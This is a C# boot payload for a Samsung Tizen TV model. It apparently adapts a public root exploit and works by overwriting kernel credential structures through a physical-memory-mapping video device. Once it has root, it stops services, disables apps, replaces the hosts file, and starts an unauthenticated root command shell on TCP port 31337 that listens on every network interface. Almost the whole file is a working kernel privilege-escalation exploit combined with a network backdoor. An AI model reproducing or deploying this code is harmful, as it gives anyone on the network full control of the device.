// DU7170 boot payload: owner (uid 5001) -> root via V4L2 physmap.
// Adapted from commit-regrets/samsung_tizen_tv_root for the DU7170
// (Novatek NT72671D, Tizen 9.0, kernel 5.4.249).
//
// Runs inside com.samsung.tv.MultiControl-Service (dotnet-inhouse, on-boot).
// uid 5001 is in group video → /dev/video40 opens.
//
// Flow: open physmap node → find our task via forked child → patch cred → root shell.

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;

internal static class Program
{
    // DU7170 kernel constants (measured, kernel 5.4.249 Novatek NT72671D)
    const uint PHYS_OFF  = 0xBC000000;  // VA = PA + PHYS_OFF
    const uint INIT_TASK = 0x0490F2C0;  // PA of init_task (swapper/0)
    const uint O_TASKS   = 0x23C;       // tasks list_head
    const uint O_PID     = 0x2E8;       // pid
    const uint O_TGID    = 0x2EC;       // tgid
    const uint O_RPARENT = 0x2F0;       // real_parent pointer (VA)
    const uint O_RCRED   = 0x3F4;       // real_cred pointer (VA)
    const uint O_CRED    = 0x3F8;       // cred pointer (VA)
    const uint O_COMM    = 0x400;       // comm[16]
    const uint OWNER_UID = 5001;
    const int  PORT      = 31337;

    // libc P/Invoke
    [DllImport("libc", SetLastError = true)] static extern int open(string path, int flags);
    [DllImport("libc", SetLastError = true)] static extern int close(int fd);
    [DllImport("libc", EntryPoint = "mmap64", SetLastError = true)]
    static extern IntPtr mmap64(IntPtr addr, UIntPtr len, int prot, int flags, int fd, long off);
    [DllImport("libc", SetLastError = true)] static extern int munmap(IntPtr addr, UIntPtr len);
    [DllImport("libc")] static extern uint getuid();
    [DllImport("libc")] static extern int fork();
    [DllImport("libc")] static extern int prctl(int opt, string arg, int a3, int a4, int a5);
    [DllImport("libc")] static extern int usleep(uint us);
    [DllImport("libc")] static extern int kill(int pid, int sig);
    [DllImport("libc", SetLastError = true)] static extern int waitpid(int pid, out int status, int options);
    [DllImport("libc", EntryPoint = "_exit")] static extern void _exit(int code);
    const int O_RDWR = 2;
    const int PROT_RW = 3;
    const int MAP_SHARED = 1;
    const int PR_SET_NAME = 15;
    const int SIGKILL = 9;
    const int WNOHANG = 1;

    static int _fd = -1;
    static readonly string[] Nodes = { "/dev/video40", "/dev/video30", "/dev/video60" };
    static readonly Dictionary<uint, IntPtr> _pages = new Dictionary<uint, IntPtr>();

    static uint V2P(uint va) => va - PHYS_OFF;
    static uint P2V(uint pa) => pa + PHYS_OFF;

    static readonly string[] LogPaths = {
        "/tmp/.dsh_du7170.log",
        "/opt/usr/data/.dsh_du7170.log",
        "/opt/usr/home/owner/share/.dsh_du7170.log"
    };

    static void Log(string msg)
    {
        string ts = "?";
        try
        {
            string u = File.ReadAllText("/proc/uptime");
            int d = u.IndexOf(' ');
            if (d > 0) ts = u.Substring(0, d);
        }
        catch { }
        string line = $"[{ts}] {msg}";
        foreach (string p in LogPaths)
            try { File.AppendAllText(p, line + "\n"); break; } catch { }
    }

    static bool OpenNode()
    {
        foreach (string node in Nodes)
        {
            int fd = open(node, O_RDWR);
            if (fd >= 0) { _fd = fd; Log($"opened {node} fd={fd}"); return true; }
        }
        return false;
    }

    static IntPtr MapPage(uint page)
    {
        if (_pages.TryGetValue(page, out IntPtr cached)) return cached;
        IntPtr p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, PROT_RW, MAP_SHARED, _fd, (long)page);
        if (p == (IntPtr)(-1)) throw new IOException($"mmap page 0x{page:X} failed");
        _pages[page] = p;
        return p;
    }

    static void DropPages()
    {
        foreach (var kv in _pages) munmap(kv.Value, (UIntPtr)0x1000);
        _pages.Clear();
    }

    static byte[] ReadPhys(uint pa, int len)
    {
        byte[] result = new byte[len];
        int off = 0;
        while (off < len)
        {
            uint addr = pa + (uint)off;
            uint page = addr & 0xFFFFF000;
            int pageOff = (int)(addr & 0xFFF);
            int chunk = Math.Min(len - off, 0x1000 - pageOff);
            IntPtr p = MapPage(page);
            Marshal.Copy(p + pageOff, result, off, chunk);
            off += chunk;
        }
        return result;
    }

    static void Write32(uint pa, uint val)
    {
        uint page = pa & 0xFFFFF000;
        int off = (int)(pa & 0xFFF);
        IntPtr p = MapPage(page);
        byte[] b = BitConverter.GetBytes(val);
        Marshal.Copy(b, 0, p + off, 4);
    }

    static uint U32(byte[] b, int off) =>
        (uint)(b[off] | (b[off+1] << 8) | (b[off+2] << 16) | (b[off+3] << 24));

    static string ReadComm(uint taskPa)
    {
        byte[] c = ReadPhys(taskPa + O_COMM, 16);
        int nul = Array.IndexOf(c, (byte)0);
        if (nul < 0) nul = 16;
        return Encoding.ASCII.GetString(c, 0, nul);
    }

    // Walk the task list BACKWARD from init_task via tasks.prev (+4).
    // tasks.next is corrupt on this kernel; tasks.prev is reliable.
    static (uint, uint) FindTask(string wantComm)
    {
        uint initTasksPrev = U32(ReadPhys(INIT_TASK + O_TASKS + 4, 4), 0);
        uint cur = initTasksPrev;
        int steps = 0;
        while (steps < 4096)
        {
            uint curVa = cur - O_TASKS;
            uint curPa = V2P(curVa);
            if (curPa == INIT_TASK) break;
            string comm = ReadComm(curPa);
            if (comm == wantComm)
            {
                uint parentVa = U32(ReadPhys(curPa + O_RPARENT, 4), 0);
                return (curPa, parentVa);
            }
            cur = U32(ReadPhys(curPa + O_TASKS + 4, 4), 0);
            steps++;
        }
        return (0, 0);
    }

    static bool PatchCred(uint credPa)
    {
        uint uid = U32(ReadPhys(credPa + 4, 4), 0);
        if (uid != OWNER_UID)
        {
            Log($"cred at 0x{credPa:X}: uid={uid}, skipping (want {OWNER_UID})");
            return uid == 0; // already rooted
        }
        // Zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid (8 × u32 at +4)
        for (uint i = 0; i < 8; i++) Write32(credPa + 4 + i * 4, 0);
        // cap_permitted  at +0x30: all caps
        Write32(credPa + 0x30, 0xFFFFFFFF);
        Write32(credPa + 0x34, 0x3F);
        // cap_effective  at +0x38: all caps
        Write32(credPa + 0x38, 0xFFFFFFFF);
        Write32(credPa + 0x3C, 0x3F);
        // Verify
        byte[] ids = ReadPhys(credPa + 4, 32);
        for (int i = 0; i < 32; i++) if (ids[i] != 0) { Log("cred verify FAIL"); return false; }
        DropPages();
        Log($"cred patched at 0x{credPa:X}");
        return true;
    }

    static bool DoRoot()
    {
        if (!OpenNode()) { Log("no physmap node"); return false; }

        // Verify init_task by reading comm
        string initComm = ReadComm(INIT_TASK);
        Log($"init_task comm: '{initComm}'");
        if (!initComm.StartsWith("swapper"))
        {
            Log("init_task PA wrong — comm mismatch");
            close(_fd); _fd = -1;
            return false;
        }

        // Fork a landmark child
        string tag = $"DU71{getuid():X4}";
        int childPid = fork();
        if (childPid == 0)
        {
            // Child: close inherited physmap fd, set comm and wait
            if (_fd >= 0) close(_fd);
            prctl(PR_SET_NAME, tag, 0, 0, 0);
            usleep(30_000_000); // 30s
            _exit(0);
        }
        if (childPid < 0) { Log("fork failed"); close(_fd); return false; }
        Log($"forked child pid={childPid} comm='{tag}'");

        usleep(50_000); // let child start

        bool ok = false;
        for (int attempt = 0; attempt < 10; attempt++)
        {
            var (childPa, parentVa) = FindTask(tag);
            if (childPa == 0)
            {
                Log($"attempt {attempt}: child not found in task list");
                usleep(200_000);
                continue;
            }

            uint parentPa = V2P(parentVa);
            Log($"found child at PA 0x{childPa:X}, parent VA 0x{parentVa:X} PA 0x{parentPa:X}");

            // Verify parent is us (comm should be the MultiControlService name)
            string parentComm = ReadComm(parentPa);
            Log($"parent comm: '{parentComm}'");

            // Patch both real_cred (+0x3F4) and cred (+0x3F8)
            uint realCredVa = U32(ReadPhys(parentPa + O_RCRED, 4), 0);
            uint credVa = U32(ReadPhys(parentPa + O_CRED, 4), 0);
            uint realCredPa = V2P(realCredVa);
            uint credPa = V2P(credVa);
            Log($"parent real_cred VA 0x{realCredVa:X} PA 0x{realCredPa:X}");
            Log($"parent cred VA 0x{credVa:X} PA 0x{credPa:X}");

            bool patched = PatchCred(credPa);
            if (realCredPa != credPa) PatchCred(realCredPa);

            if (patched)
            {
                usleep(100_000);
                if (getuid() == 0) { ok = true; Log("ROOT achieved!"); break; }
                Log($"cred patched but uid still {getuid()}, retrying...");
            }
            usleep(500_000);
        }

        // Reap child
        kill(childPid, SIGKILL);
        waitpid(childPid, out _, 0);

        if (_fd >= 0) { close(_fd); _fd = -1; }
        DropPages();
        return ok;
    }

    static void SetSmack()
    {
        try { File.WriteAllText("/proc/self/attr/current", "System"); } catch { }
    }

    static string Run(string cmd)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh")
            { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            psi.ArgumentList.Add("-c");
            psi.ArgumentList.Add(cmd);
            psi.Environment["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
            var proc = System.Diagnostics.Process.Start(psi);
            string stdout = "", stderr = "";
            var t1 = new Thread(() => { try { stdout = proc.StandardOutput.ReadToEnd(); } catch { } });
            var t2 = new Thread(() => { try { stderr = proc.StandardError.ReadToEnd(); } catch { } });
            t1.Start(); t2.Start();
            proc.WaitForExit(30_000);
            t1.Join(5000); t2.Join(5000);
            return stdout + stderr;
        }
        catch (Exception e) { return "ERR " + e.Message; }
    }

    static bool RunOk(string cmd) => Run(cmd + " && echo __OK || echo __FAIL").Contains("__OK");

    static bool BareName(string s)
    {
        if (s.Length == 0 || s.Length > 128) return false;
        foreach (char c in s)
            if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                  (c >= '0' && c <= '9') || c == '@' || c == '.' || c == '_' || c == '-'))
                return false;
        return true;
    }

    static string[] ReadPolicy(string path)
    {
        try
        {
            if (!File.Exists(path)) return null;
            var kept = new List<string>();
            foreach (string raw in File.ReadAllLines(path))
            {
                string s = raw.Trim();
                if (s.Length == 0 || s[0] == '#') continue;
                if (!BareName(s)) continue;
                kept.Add(s);
            }
            return kept.ToArray();
        }
        catch { return null; }
    }

    static readonly string[] UnitDirs = {
        "/etc/systemd/system", "/usr/lib/systemd/system",
        "/lib/systemd/system", "/prd/usr/lib/systemd/system" };

    static bool UnitExists(string unit)
    {
        foreach (string d in UnitDirs)
            try { if (File.Exists(d + "/" + unit) || Directory.Exists(d + "/" + unit)) return true; } catch { }
        return false;
    }

    const string MaskList = "/opt/usr/data/debloat-masks.txt";
    const string KillList = "/opt/usr/data/debloat-kill.txt";
    const string AppList  = "/opt/usr/data/debloat-apps.txt";
    const string EnforceFile = "/opt/usr/data/debloat-enforce";
    const string PkgDb = "/opt/dbspace/.pkgmgr_parser.db";
    const string MaskRunDir = "/run/systemd/system";
    const string HostsCustom = "/opt/usr/data/hosts.custom";
    const string SetHomeDll = "/opt/usr/data/sethome/SetHome.dll";

    static void MaskServices()
    {
        var units = ReadPolicy(MaskList);
        if (units == null || units.Length == 0) { Log("masks: skip (no list)"); return; }

        int masks = 0, killed = 0;
        var live = new List<string>();
        foreach (string u in units)
        {
            if (!UnitExists(u)) continue;
            live.Add(u);
            string p = MaskRunDir + "/" + u;
            try { if (File.Exists(p)) { masks++; continue; } } catch { }
            if (RunOk("ln -sf /dev/null " + p)) masks++;
        }
        RunOk("systemctl daemon-reload");
        if (live.Count > 0)
        {
            string batch = "systemctl --no-block stop";
            foreach (string u in live) batch += " " + u;
            Run(batch);
        }

        var bins = ReadPolicy(KillList);
        if (bins != null)
        {
            var want = new HashSet<string>();
            foreach (string b in bins) { want.Add("/usr/bin/" + b); want.Add("/prd/usr/bin/" + b); }
            try
            {
                foreach (string dir in Directory.GetDirectories("/proc"))
                {
                    string pid = Path.GetFileName(dir);
                    if (pid == "1") continue;
                    bool numeric = true;
                    foreach (char c in pid) if (c < '0' || c > '9') { numeric = false; break; }
                    if (!numeric) continue;
                    string target;
                    try { target = new FileInfo(dir + "/exe").LinkTarget; } catch { continue; }
                    if (target == null) continue;
                    int cut = target.IndexOf(" (deleted)", StringComparison.Ordinal);
                    if (cut > 0) target = target.Substring(0, cut);
                    if (!want.Contains(target)) continue;
                    if (RunOk("kill -9 " + pid)) killed++;
                }
            }
            catch { }
        }

        RunOk("dbus-send --system --dest=org.tizen.tv.avoc /org/tizen/tv/avoc " +
              "org.tizen.tv.avoc.AvOutputControl.SetNewHome int32:0");

        Log($"masks: masked={masks} live={live.Count} killed={killed}");
    }

    static void ReassertDebloatApps()
    {
        if (!File.Exists(EnforceFile)) { Log("apps: skip (not armed)"); return; }
        var apps = ReadPolicy(AppList);
        if (apps == null || apps.Length == 0) { Log("apps: skip (no list)"); return; }

        string inClause = "'" + string.Join("','", apps) + "'";
        string dump = Run($"sqlite3 -readonly {PkgDb} \".timeout 5000\" " +
            $"\"select app_id, app_disable from package_app_info where app_id in ({inClause});\"");
        if (dump.Contains("Error") || dump.Contains("not found")) { Log("apps: db error"); return; }

        int repaired = 0;
        foreach (string line in dump.Split('\n'))
        {
            int bar = line.LastIndexOf('|');
            if (bar <= 0) continue;
            string id = line.Substring(0, bar).Trim();
            string flag = line.Substring(bar + 1).Trim();
            if (flag != "true")
            {
                RunOk("pkgcmd -D -t app -n " + id + " --global");
                repaired++;
            }
        }
        Log($"apps: total={apps.Length} repaired={repaired}");
    }

    static void BindHosts()
    {
        if (!File.Exists(HostsCustom)) { Log("hosts: skip (no custom file)"); return; }
        RunOk("mount --bind " + HostsCustom + " /etc/hosts");
        Log("hosts: bind-mounted");
    }

    static void RemapHome()
    {
        if (!File.Exists(SetHomeDll)) { Log("sethome: skip (no dll)"); return; }
        string r = Run("/usr/bin/dotnet " + SetHomeDll + " HomeScreen.Launcher 2>&1");
        Log("sethome: " + r.Replace('\n', ' ').Trim());
    }

    static void IgnoreCecStandby()
    {
        string r = Run("dbus-send --system --print-reply --dest=org.tizen.tv.hdmicec " +
            "/org/tizen/tv/hdmicec org.tizen.tv.HdmiCec.IgnoreCECStandby int32:1 2>&1");
        Log("cec: " + (r.Contains("int32 1") ? "standby-ignore set" : r.Replace('\n', ' ').Trim()));
    }

    static void Shell(TcpClient c)
    {
        try
        {
            var ns = c.GetStream();
            ns.ReadTimeout = 600_000;
            ns.WriteTimeout = 30_000;
            byte[] buf = new byte[4096];
            var sb = new StringBuilder();
            byte[] prompt = Encoding.ASCII.GetBytes("du7170# ");
            ns.Write(prompt, 0, prompt.Length);
            while (true)
            {
                int n = ns.Read(buf, 0, buf.Length);
                if (n <= 0) break;
                sb.Append(Encoding.ASCII.GetString(buf, 0, n));
                if (!sb.ToString().Contains('\n')) continue;
                string line = sb.ToString().TrimEnd('\r', '\n');
                sb.Clear();
                if (line == "exit" || line == "quit") break;
                if (line.Length == 0) { ns.Write(prompt, 0, prompt.Length); continue; }

                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh")
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                    };
                    psi.ArgumentList.Add("-c");
                    psi.ArgumentList.Add(line);
                    psi.Environment["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
                    var proc = System.Diagnostics.Process.Start(psi);
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(10_000);
                    string output = stdout + stderr;
                    if (output.Length > 0)
                    {
                        byte[] ob = Encoding.UTF8.GetBytes(output);
                        ns.Write(ob, 0, ob.Length);
                        if (!output.EndsWith("\n")) ns.Write(new byte[] { 10 }, 0, 1);
                    }
                }
                catch (Exception ex)
                {
                    byte[] eb = Encoding.ASCII.GetBytes($"error: {ex.Message}\n");
                    ns.Write(eb, 0, eb.Length);
                }
                ns.Write(prompt, 0, prompt.Length);
            }
        }
        catch { }
        finally { try { c.Close(); } catch { } }
    }

    static void ServeShell()
    {
        var listener = new TcpListener(IPAddress.Any, PORT);
        listener.Start(2);
        Log($"root shell listening on port {PORT}");
        while (true)
        {
            try
            {
                var c = listener.AcceptTcpClient();
                Log($"shell connection from {c.Client.RemoteEndPoint}");
                var t = new Thread(() => Shell(c)) { IsBackground = true };
                t.Start();
            }
            catch (Exception ex) { Log($"accept error: {ex.Message}"); }
        }
    }

    static void Main(string[] args)
    {
        Log("DU7170 boot payload starting");
        Log($"uid={getuid()}, pid={System.Diagnostics.Process.GetCurrentProcess().Id}");

        // Retry root for up to 3 minutes
        bool rooted = false;
        for (int i = 0; i < 18 && !rooted; i++)
        {
            try { rooted = DoRoot(); }
            catch (Exception ex) { Log($"DoRoot error: {ex.Message}"); }
            if (!rooted) usleep(10_000_000); // 10s
        }

        if (rooted)
        {
            Log($"rooted! uid={getuid()}");
            SetSmack();
            try { File.WriteAllText("/tmp/.du7170_root_proof", $"rooted at {DateTime.UtcNow:O}\nuid={getuid()}\n"); } catch { }

            new Thread(() => { Log("thread:masks starting"); try { MaskServices(); } catch (Exception e) { Log("masks exception: " + e.GetType().Name + " " + e.Message); } }) { IsBackground = true }.Start();
            new Thread(() => { Log("thread:apps starting"); try { ReassertDebloatApps(); } catch (Exception e) { Log("apps exception: " + e.GetType().Name + " " + e.Message); } }) { IsBackground = true }.Start();
            new Thread(() => { Log("thread:hosts starting"); try { BindHosts(); } catch (Exception e) { Log("hosts exception: " + e.GetType().Name + " " + e.Message); } }) { IsBackground = true }.Start();
            new Thread(() => { Log("thread:sethome starting"); try { RemapHome(); } catch (Exception e) { Log("sethome exception: " + e.GetType().Name + " " + e.Message); } }) { IsBackground = true }.Start();
            new Thread(() => { Log("thread:cec starting"); try { IgnoreCecStandby(); } catch (Exception e) { Log("cec exception: " + e.GetType().Name + " " + e.Message); } }) { IsBackground = true }.Start();

            ServeShell();
        }
        else
        {
            Log($"failed to root after retries, uid={getuid()}");
            // Keep running so the app doesn't restart endlessly
            Thread.Sleep(Timeout.Infinite);
        }
    }
}
